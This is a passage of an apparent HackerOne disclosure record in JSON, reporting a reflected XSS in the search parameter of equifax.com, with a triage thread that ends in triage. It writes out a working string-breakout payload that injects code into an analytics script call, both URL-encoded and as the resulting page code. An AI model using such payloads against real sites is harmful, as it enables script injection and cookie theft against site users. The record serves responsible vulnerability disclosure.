@@ -1,0 +1,613 @@
+{
+    "id": 1818172,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODE4MTcy",
+    "url": "https://hackerone.com/reports/1818172",
+    "title": "reflected XSS in [www.equifax.com]",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "medium",
+    "readable_substate": "Resolved",
+    "created_at": "2022-12-28T20:06:27.391Z",
+    "submitted_at": "2022-12-28T20:06:27.578Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "abdo0x",
+        "url": "/abdo0x",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 5044,
+        "url": "https://hackerone.com/equifax",
+        "handle": "equifax",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/005/044/ba20ca159dad308d753710d2b8ae8dd665a60b80_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/005/044/ba20ca159dad308d753710d2b8ae8dd665a60b80_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": false,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Equifax-vdp",
+            "twitter_handle": "",
+            "website": "http://www.equifax.com",
+            "about": "Vulnerability Disclosure Program"
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2023-04-23T12:40:15.348Z",
+    "bug_reporter_agreed_on_going_public_at": "2023-03-24T12:40:14.823Z",
+    "team_member_agreed_on_going_public_at": null,
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "hi , I hope you are well, i found reflected XSS in this endpoint via ```q```  parameter:\n```https://www.equifax.com/personal/search?q=broook```\n\n###Steps:\n\n1. open ```https://www.equifax.com/personal/search?q=broook```\n2. view the source code of the page and search for word broook you will find that it reflected in the source code: \n{F2094877}\n\n-\n-\n\n3. ```broook``` word reflected in javascript code:\n```\n<script type=\"text/javascript\">\n\nvar pageProduct = null;\nwindow.onload = function(e){ \n\t\t\n\t\tAnalytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: \"broook\" , numOfSearchResultsReturned: 1});\n\t\n}\n</script>\n\n```\n-\n-\n\n4. By using this payload ```%22%20%2C%20internalSearchTerm%3A%20%5B\"broook\"%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b``` , I modified the parameters of the ```Analytics.trackEvent``` function to be like this:\n```\n<script type=\"text/javascript\">\n\nvar pageProduct = null;\nwindow.onload = function(e){ \n\t\t\n\t\tAnalytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: \"\" , internalSearchTerm: [\"broook\"].map(alert) , numOfSearchResultsReturned: \"b\" , numOfSearchResultsReturned: 1});\n\t\n}\n</script>\n```\n{F2094892}\n\n-\n-\n\n5. the following is the link with my XSS payload:   https://www.equifax.com/personal/search?q=%22%20%2C%20internalSearchTerm%3A%20%5B\"broook\"%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b\n\n{F2094902}\n\n## Impact\n\nan attacker can exeute JS codes on the victims and this could be steal user's cookies",
+    "weakness": {
+        "id": 61,
+        "name": "Cross-site Scripting (XSS) - Reflected"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 2094877,
+            "file_name": "Screenshot_2022-12-28_20-43-33.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hnovttpeuk8xlyjtdv6ol6uy8ih1?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2022-12-28_20-43-33.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2022-12-28_20-43-33.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3TTIL2DQ%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T065643Z&X-Amz-Expires=1258&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIByrU6zu8UCr8YtkwWSgXBfGQmLVgHk%2FDibETv1fH01bAiBXrcwW0PCeg6TL8m1olxHgQIbYiRGi1bNtT%2FNR5kuhiyq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM84NLS3Qx4RBN8JsuKo8Fb%2FEcEjuZHQhpG0hCsR37xPLbjFFmj%2F7od%2Bw0AiEgAjGL6miAi%2FW1cNhAAo%2BIAm4OpoS6jusauBAmUaM0lNbf3CuAyr%2BPgxjKKcA639ZetIv3YHfccZhiqLhRwxhrZOYxm%2FBk6iMuuvQP9TmhDW4dBonLo1GLRxMejcheF7P9X4Hmpm0h46%2Bp5GWhy8ml5qA0KZVnMX7M%2BD3HsLGW4Xksla1ULBFMOCmT8k3acIbg53l8qSrBp9zP%2Fc%2FrIAaFIkFOsolHzYloHtFfwIRUjYAr%2BIL8P3bP4aE2ChT%2Bvk%2BoF7Ze9wf%2FMMjUldJzXa%2Ba%2FCEyqQ6UwVx65pa4ANje%2BuaoIkg0O6BIUoQ8Hv%2FA41rpNabzDRiMjMXnnyYfpHQQNYTq%2B%2FdMjDR6BnyKMrrkHbo45rPJH57MNl1SQJD%2FR0605WmW2dbM6uDWdlHQ0xguHyj%2BHIWYsR5Mo73NWx5h3HzM3myqOYDZ1%2B4TSpxGOJG45cMi06atADf6q6gmCQYwm%2BwMrm0VO0tQGs7umFU1CnvnVxn0rVeL4yWQhYupQiY7hCBiWvaTcbFFkPgnGwgEBFjE3CXoilzwiTqEm9VY%2FgOwWe9%2B2kJW3XYONv8tCdZb39yYRtlTE9s73Qsh9D0WFCSCeP31lSnz%2FYVjiAc1SXbf8Dv1QP412%2FbKNmBAvwszv2ztxs3m0oVcJ2VuTXzkkYJqvjsG3qQDNV6Je3uE%2B1u14uhYO776iLEDjp0QLoN94EJAuB26Av4g%2FPr6fq9nFuGAdQMBd4MGSoGofv8KSyLylB%2FhoM%2B1zo2ndaOBpFKiC8IGVjhqwWWOUsk9KVE8Bs5z8u2pE%2FXYVFffVCj2MBISdkHqQ4z%2FWkxjJNtJYcuwsjDcibWnBjqyATfijhJ45QkjTwmJm1gKbwymXMp8DO%2BLJZwtXFXKYdifN4RX5wJLJV75e7CU69zvLRBdV4qaXMnEsXt0ehTdT6TOvkC2AawlILIumcWbw6nXVpV%2FCrgl4uW8nMZR6XfBGHnSyH8moGneD6WsoL0S%2Bf%2BA%2FOHOv21Kq0Vg8mKloNL9RmyVVYRm5fF7%2FtLbD%2Ftl6aG0h42AdHzDJDvpFCVBcGGom9i3KA316WtijHcjh1P2gq4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=376f5a7ec77357011566bf01723de4e49a4e0b7368204c1b54c2da58ec4654b0",
+            "file_size": 284194,
+            "type": "image/png"
+        },
+        {
+            "id": 2094892,
+            "file_name": "Screenshot_2022-12-28_20-56-04.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2czg89f6uvldgm64w66u8f4ttvbz?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2022-12-28_20-56-04.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2022-12-28_20-56-04.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3TTIL2DQ%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T065643Z&X-Amz-Expires=1258&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIByrU6zu8UCr8YtkwWSgXBfGQmLVgHk%2FDibETv1fH01bAiBXrcwW0PCeg6TL8m1olxHgQIbYiRGi1bNtT%2FNR5kuhiyq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM84NLS3Qx4RBN8JsuKo8Fb%2FEcEjuZHQhpG0hCsR37xPLbjFFmj%2F7od%2Bw0AiEgAjGL6miAi%2FW1cNhAAo%2BIAm4OpoS6jusauBAmUaM0lNbf3CuAyr%2BPgxjKKcA639ZetIv3YHfccZhiqLhRwxhrZOYxm%2FBk6iMuuvQP9TmhDW4dBonLo1GLRxMejcheF7P9X4Hmpm0h46%2Bp5GWhy8ml5qA0KZVnMX7M%2BD3HsLGW4Xksla1ULBFMOCmT8k3acIbg53l8qSrBp9zP%2Fc%2FrIAaFIkFOsolHzYloHtFfwIRUjYAr%2BIL8P3bP4aE2ChT%2Bvk%2BoF7Ze9wf%2FMMjUldJzXa%2Ba%2FCEyqQ6UwVx65pa4ANje%2BuaoIkg0O6BIUoQ8Hv%2FA41rpNabzDRiMjMXnnyYfpHQQNYTq%2B%2FdMjDR6BnyKMrrkHbo45rPJH57MNl1SQJD%2FR0605WmW2dbM6uDWdlHQ0xguHyj%2BHIWYsR5Mo73NWx5h3HzM3myqOYDZ1%2B4TSpxGOJG45cMi06atADf6q6gmCQYwm%2BwMrm0VO0tQGs7umFU1CnvnVxn0rVeL4yWQhYupQiY7hCBiWvaTcbFFkPgnGwgEBFjE3CXoilzwiTqEm9VY%2FgOwWe9%2B2kJW3XYONv8tCdZb39yYRtlTE9s73Qsh9D0WFCSCeP31lSnz%2FYVjiAc1SXbf8Dv1QP412%2FbKNmBAvwszv2ztxs3m0oVcJ2VuTXzkkYJqvjsG3qQDNV6Je3uE%2B1u14uhYO776iLEDjp0QLoN94EJAuB26Av4g%2FPr6fq9nFuGAdQMBd4MGSoGofv8KSyLylB%2FhoM%2B1zo2ndaOBpFKiC8IGVjhqwWWOUsk9KVE8Bs5z8u2pE%2FXYVFffVCj2MBISdkHqQ4z%2FWkxjJNtJYcuwsjDcibWnBjqyATfijhJ45QkjTwmJm1gKbwymXMp8DO%2BLJZwtXFXKYdifN4RX5wJLJV75e7CU69zvLRBdV4qaXMnEsXt0ehTdT6TOvkC2AawlILIumcWbw6nXVpV%2FCrgl4uW8nMZR6XfBGHnSyH8moGneD6WsoL0S%2Bf%2BA%2FOHOv21Kq0Vg8mKloNL9RmyVVYRm5fF7%2FtLbD%2Ftl6aG0h42AdHzDJDvpFCVBcGGom9i3KA316WtijHcjh1P2gq4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=122bfdd34bee6cc300d7ea6a0a8e33b3db974af19556b8b993ade391b797b362",
+            "file_size": 299285,
+            "type": "image/png"
+        },
+        {
+            "id": 2094902,
+            "file_name": "Screenshot_2022-12-28_20-54-41.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/s45sl4ubo0oln0fx0yocpfexcv9o?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2022-12-28_20-54-41.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2022-12-28_20-54-41.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3TTIL2DQ%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T065643Z&X-Amz-Expires=1258&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIByrU6zu8UCr8YtkwWSgXBfGQmLVgHk%2FDibETv1fH01bAiBXrcwW0PCeg6TL8m1olxHgQIbYiRGi1bNtT%2FNR5kuhiyq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM84NLS3Qx4RBN8JsuKo8Fb%2FEcEjuZHQhpG0hCsR37xPLbjFFmj%2F7od%2Bw0AiEgAjGL6miAi%2FW1cNhAAo%2BIAm4OpoS6jusauBAmUaM0lNbf3CuAyr%2BPgxjKKcA639ZetIv3YHfccZhiqLhRwxhrZOYxm%2FBk6iMuuvQP9TmhDW4dBonLo1GLRxMejcheF7P9X4Hmpm0h46%2Bp5GWhy8ml5qA0KZVnMX7M%2BD3HsLGW4Xksla1ULBFMOCmT8k3acIbg53l8qSrBp9zP%2Fc%2FrIAaFIkFOsolHzYloHtFfwIRUjYAr%2BIL8P3bP4aE2ChT%2Bvk%2BoF7Ze9wf%2FMMjUldJzXa%2Ba%2FCEyqQ6UwVx65pa4ANje%2BuaoIkg0O6BIUoQ8Hv%2FA41rpNabzDRiMjMXnnyYfpHQQNYTq%2B%2FdMjDR6BnyKMrrkHbo45rPJH57MNl1SQJD%2FR0605WmW2dbM6uDWdlHQ0xguHyj%2BHIWYsR5Mo73NWx5h3HzM3myqOYDZ1%2B4TSpxGOJG45cMi06atADf6q6gmCQYwm%2BwMrm0VO0tQGs7umFU1CnvnVxn0rVeL4yWQhYupQiY7hCBiWvaTcbFFkPgnGwgEBFjE3CXoilzwiTqEm9VY%2FgOwWe9%2B2kJW3XYONv8tCdZb39yYRtlTE9s73Qsh9D0WFCSCeP31lSnz%2FYVjiAc1SXbf8Dv1QP412%2FbKNmBAvwszv2ztxs3m0oVcJ2VuTXzkkYJqvjsG3qQDNV6Je3uE%2B1u14uhYO776iLEDjp0QLoN94EJAuB26Av4g%2FPr6fq9nFuGAdQMBd4MGSoGofv8KSyLylB%2FhoM%2B1zo2ndaOBpFKiC8IGVjhqwWWOUsk9KVE8Bs5z8u2pE%2FXYVFffVCj2MBISdkHqQ4z%2FWkxjJNtJYcuwsjDcibWnBjqyATfijhJ45QkjTwmJm1gKbwymXMp8DO%2BLJZwtXFXKYdifN4RX5wJLJV75e7CU69zvLRBdV4qaXMnEsXt0ehTdT6TOvkC2AawlILIumcWbw6nXVpV%2FCrgl4uW8nMZR6XfBGHnSyH8moGneD6WsoL0S%2Bf%2BA%2FOHOv21Kq0Vg8mKloNL9RmyVVYRm5fF7%2FtLbD%2Ftl6aG0h42AdHzDJDvpFCVBcGGom9i3KA316WtijHcjh1P2gq4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cb795894bdaedc5fc9aa4103542d1724d5818e8facf520d93fd1e5896c1829d7",
+            "file_size": 231445,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": "2023-04-23T12:40:15.034Z",
+    "allow_singular_disclosure_after": -11038588.630471071,
+    "singular_disclosure_allowed": true,
+    "vote_count": 17,
+    "voters": [
+        "abdo0x",
+        "8910jq",
+        "nicochess",
+        "zy9ard3",
+        "shubham_srt",
+        "address_below0",
+        "shivammusic",
+        "riteshs4hu",
+        "cybercrusader_br",
+        "sayin",
+        "and 7 more..."
+    ],
+    "severity": {
+        "rating": "medium",
+        "score": 5.6,
+        "author_type": "Team",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "none",
+            "user_interaction": "required",
+            "scope": "changed",
+            "confidentiality": "low",
+            "integrity": "none",
+            "availability": "none"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 33186,
+        "asset_type": "OTHER",
+        "asset_identifier": "*equifax.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 19727968,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNeedsMoreInfo",
+            "message": "Hi @broook_dz,\n\nThank you for your submission. I hope you are well. \n\nWe are unable to reproduce your submission. When visiting the PoC link, what action should be taken to trigger the XSS?\n\nKind regards,\n@h1_analyst_magnus",
+            "automated_response": false,
+            "created_at": "2022-12-28T21:05:11.019Z",
+            "updated_at": "2022-12-28T21:05:11.019Z",
+            "actor": {
+                "username": "h1_analyst_magnus",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_magnus",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oh5rnn06wtaj1jegmqf5omn4hyu9/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19728126,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNew",
+            "message": "You don't need any action, once you visit the page the XSS will be executed .",
+            "automated_response": false,
+            "created_at": "2022-12-28T21:55:13.111Z",
+            "updated_at": "2022-12-28T21:55:13.111Z",
+            "actor": {
+                "username": "abdo0x",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdo0x",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19728135,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "try open ```https://www.equifax.com/personal/search?q=```\nand use this payload in ```q``` parameter: \n```%22%20%2C%20internalSearchTerm%3A%20%5B\"broook\"%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b```",
+            "automated_response": false,
+            "created_at": "2022-12-28T22:00:43.442Z",
+            "updated_at": "2022-12-28T22:00:43.442Z",
+            "actor": {
+                "username": "abdo0x",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdo0x",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19728176,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": ".",
+            "automated_response": false,
+            "created_at": "2022-12-28T22:17:15.719Z",
+            "updated_at": "2022-12-28T22:19:07.404Z",
+            "actor": {
+                "username": "abdo0x",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdo0x",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19728186,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "PoC:\n\n{F2095015}",
+            "automated_response": false,
+            "created_at": "2022-12-28T22:20:23.506Z",
+            "updated_at": "2022-12-28T22:20:23.506Z",
+            "actor": {
+                "username": "abdo0x",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdo0x",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 2095015,
+                    "filename": "Screenrecorder-2022-12-28-22-41-59-431.mp4",
+                    "type": "video/mp4",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ymxznqypfacuahld4j710ubjh0su?response-content-disposition=attachment%3B%20filename%3D%22Screenrecorder-2022-12-28-22-41-59-431.mp4%22%3B%20filename%2A%3DUTF-8%27%27Screenrecorder-2022-12-28-22-41-59-431.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3TTIL2DQ%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T065643Z&X-Amz-Expires=1258&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIByrU6zu8UCr8YtkwWSgXBfGQmLVgHk%2FDibETv1fH01bAiBXrcwW0PCeg6TL8m1olxHgQIbYiRGi1bNtT%2FNR5kuhiyq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM84NLS3Qx4RBN8JsuKo8Fb%2FEcEjuZHQhpG0hCsR37xPLbjFFmj%2F7od%2Bw0AiEgAjGL6miAi%2FW1cNhAAo%2BIAm4OpoS6jusauBAmUaM0lNbf3CuAyr%2BPgxjKKcA639ZetIv3YHfccZhiqLhRwxhrZOYxm%2FBk6iMuuvQP9TmhDW4dBonLo1GLRxMejcheF7P9X4Hmpm0h46%2Bp5GWhy8ml5qA0KZVnMX7M%2BD3HsLGW4Xksla1ULBFMOCmT8k3acIbg53l8qSrBp9zP%2Fc%2FrIAaFIkFOsolHzYloHtFfwIRUjYAr%2BIL8P3bP4aE2ChT%2Bvk%2BoF7Ze9wf%2FMMjUldJzXa%2Ba%2FCEyqQ6UwVx65pa4ANje%2BuaoIkg0O6BIUoQ8Hv%2FA41rpNabzDRiMjMXnnyYfpHQQNYTq%2B%2FdMjDR6BnyKMrrkHbo45rPJH57MNl1SQJD%2FR0605WmW2dbM6uDWdlHQ0xguHyj%2BHIWYsR5Mo73NWx5h3HzM3myqOYDZ1%2B4TSpxGOJG45cMi06atADf6q6gmCQYwm%2BwMrm0VO0tQGs7umFU1CnvnVxn0rVeL4yWQhYupQiY7hCBiWvaTcbFFkPgnGwgEBFjE3CXoilzwiTqEm9VY%2FgOwWe9%2B2kJW3XYONv8tCdZb39yYRtlTE9s73Qsh9D0WFCSCeP31lSnz%2FYVjiAc1SXbf8Dv1QP412%2FbKNmBAvwszv2ztxs3m0oVcJ2VuTXzkkYJqvjsG3qQDNV6Je3uE%2B1u14uhYO776iLEDjp0QLoN94EJAuB26Av4g%2FPr6fq9nFuGAdQMBd4MGSoGofv8KSyLylB%2FhoM%2B1zo2ndaOBpFKiC8IGVjhqwWWOUsk9KVE8Bs5z8u2pE%2FXYVFffVCj2MBISdkHqQ4z%2FWkxjJNtJYcuwsjDcibWnBjqyATfijhJ45QkjTwmJm1gKbwymXMp8DO%2BLJZwtXFXKYdifN4RX5wJLJV75e7CU69zvLRBdV4qaXMnEsXt0ehTdT6TOvkC2AawlILIumcWbw6nXVpV%2FCrgl4uW8nMZR6XfBGHnSyH8moGneD6WsoL0S%2Bf%2BA%2FOHOv21Kq0Vg8mKloNL9RmyVVYRm5fF7%2FtLbD%2Ftl6aG0h42AdHzDJDvpFCVBcGGom9i3KA316WtijHcjh1P2gq4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dc1f156796530c9d066f03b563881679be80f8ab1541d2ce24ca6700646cee67"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19734194,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "Hey @broook_dz,\n\nThank you for your report!\n\nAfter review, there doesn’t seem to be any significant security risk and/or security impact as a result of the behavior you are describing.\n\nThis issue does not appear to be valid since visiting the provided PoC link yields no alert to indicate a successful Cross-Site Scripting attack.\n\nAs a result, we will be closing this report as informative. This will not have any impact on your Signal or Reputation score. We appreciate your effort and look forward to seeing more reports from you in the future.\n\nKind regards,\n@h1_analyst_magnus",
+            "automated_response": false,
+            "created_at": "2022-12-29T14:44:15.765Z",
+            "updated_at": "2022-12-29T14:44:15.765Z",
+            "actor": {
+                "username": "h1_analyst_magnus",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_magnus",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oh5rnn06wtaj1jegmqf5omn4hyu9/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19734453,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "The report was closed Informative because the vulnerability does not affect the site, or the vulnerability does not exist  ??",
+            "automated_response": false,
+            "created_at": "2022-12-29T15:31:13.841Z",
+            "updated_at": "2022-12-29T15:31:13.841Z",
+            "actor": {
+                "username": "abdo0x",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdo0x",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19734469,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @broook_dz,\n\nThe issue is not reproducible. \n\nKind regards,\n@h1_analyst_magnus",
+            "automated_response": false,
+            "created_at": "2022-12-29T15:33:27.110Z",
+            "updated_at": "2022-12-29T15:33:27.110Z",
+            "actor": {
+                "username": "h1_analyst_magnus",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_magnus",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oh5rnn06wtaj1jegmqf5omn4hyu9/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19734931,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "It's weird. I was able to reproducible the vulnerability in different devices and browsers. Can I see the source code when you visit the PoC  link at this code:\n```\nvar pageProduct = null;\nwindow.onload = function(e){ \n\t\t\n\t\tAnalytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: \"\" , internalSearchTerm: [\"broook\"].map(alert) , numOfSearchResultsReturned: \"b\" , numOfSearchResultsReturned: 1});\n\t\n}\n\n```",
+            "automated_response": false,
+            "created_at": "2022-12-29T16:47:49.475Z",
+            "updated_at": "2022-12-29T16:47:49.475Z",
+            "actor": {
+                "username": "abdo0x",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdo0x",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19734974,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugReopened",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-12-29T16:57:43.988Z",
+            "updated_at": "2022-12-29T16:57:43.988Z",
+            "actor": {
+                "username": "h1_analyst_magnus",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_magnus",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oh5rnn06wtaj1jegmqf5omn4hyu9/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19734978,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Hello @broook_dz,\n\nThank you for your submission! We have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nThanks,\n@h1_analyst_magnus",
+            "automated_response": false,
+            "created_at": "2022-12-29T16:58:38.907Z",
+            "updated_at": "2022-12-29T16:58:38.907Z",
+            "actor": {
+                "username": "h1_analyst_magnus",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_magnus",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oh5rnn06wtaj1jegmqf5omn4hyu9/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19734986,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": null,
+            "automated_response": false,
+            "created_at": "2022-12-29T16:59:25.406Z",
+            "updated_at": "2022-12-29T16:59:25.406Z",
+            "additional_data": {
